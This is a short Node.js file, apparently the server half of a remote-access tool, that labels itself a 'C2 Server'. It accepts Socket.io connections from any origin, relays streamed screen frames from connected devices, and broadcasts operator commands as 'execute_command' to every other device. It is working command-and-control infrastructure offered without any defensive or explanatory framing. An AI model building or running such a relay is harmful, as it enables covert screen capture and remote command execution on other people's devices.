const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

io.on('connection', (socket) => {
    console.log('Dispositivo conectado: ' + socket.id);
    socket.on('screen_frame', (data) => {
        socket.broadcast.emit('render_frame', data);
    });
    socket.on('send_command', (command) => {
        socket.broadcast.emit('execute_command', command);
    });
    socket.on('disconnect', () => {
        console.log('Dispositivo desconectado: ' + socket.id);
    });
});

server.listen(3000, '0.0.0.0', () => {
    console.log('C2 Server Online na porta 3000');
});
